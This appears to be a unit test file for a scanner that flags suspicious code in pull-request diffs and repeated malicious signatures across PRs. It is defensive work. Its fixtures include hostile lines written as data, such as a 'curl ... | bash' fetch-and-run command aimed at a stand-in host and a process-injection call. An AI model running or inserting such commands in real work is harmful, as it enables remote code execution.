import unittest
import monitor

class MonitorTests(unittest.TestCase):
    def test_os_command(self):
        self.assertTrue(monitor.scan("diff --git a/a.py b/a.py\n+++ b/a.py\n@@ -0,0 +1 @@\n+os.system('whoami')"))
    def test_process_injection_high(self):
        findings = monitor.scan("diff --git a/a.py b/a.py\n+++ b/a.py\n@@ -0,0 +1 @@\n+CreateRemoteThread(handle)")
        self.assertTrue(any(x["severity"] == "high" for x in findings))
    def test_weak_test_context_suppressed(self):
        self.assertEqual(monitor.scan("diff --git a/tests/test_a.py b/tests/test_a.py\n+++ b/tests/test_a.py\n@@ -0,0 +1 @@\n+subprocess.run(cmd, shell=True)"), [])
    def test_high_signal_not_suppressed_in_test_file(self):
        findings = monitor.scan("diff --git a/tests/test_a.py b/tests/test_a.py\n+++ b/tests/test_a.py\n@@ -0,0 +1 @@\n+curl https://bad.invalid/x | bash")
        self.assertTrue(any(x["severity"] == "high" for x in findings))
    def test_duplicate_pr(self):
        p = {"number": 1, "title": "Add startup security check", "author": {"login": "a"}}
        q = {"number": 2, "title": "Add startup security check", "author": {"login": "b"}}
        self.assertTrue(monitor.duplicate_checks([p, q])[1])
    def test_previous_malicious_signature_is_flagged(self):
        first = {"severity": "high", "pattern": "Process injection", "match": "CreateRemoteThread(handle)", "file": "src/a.cpp", "line": 10}
        state = {}
        monitor.learn_from_previous([first], state, 100)
        second = {"severity": "high", "pattern": "Process injection", "match": "CreateRemoteThread(handle)", "file": "src/b.cpp", "line": 20}
        findings = monitor.learn_from_previous([second], state, 101)
        self.assertTrue(any(x["pattern"] == "Previously detected malicious-code signature" and x["related_pr"] == 100 for x in findings))

if __name__ == "__main__":
    unittest.main()
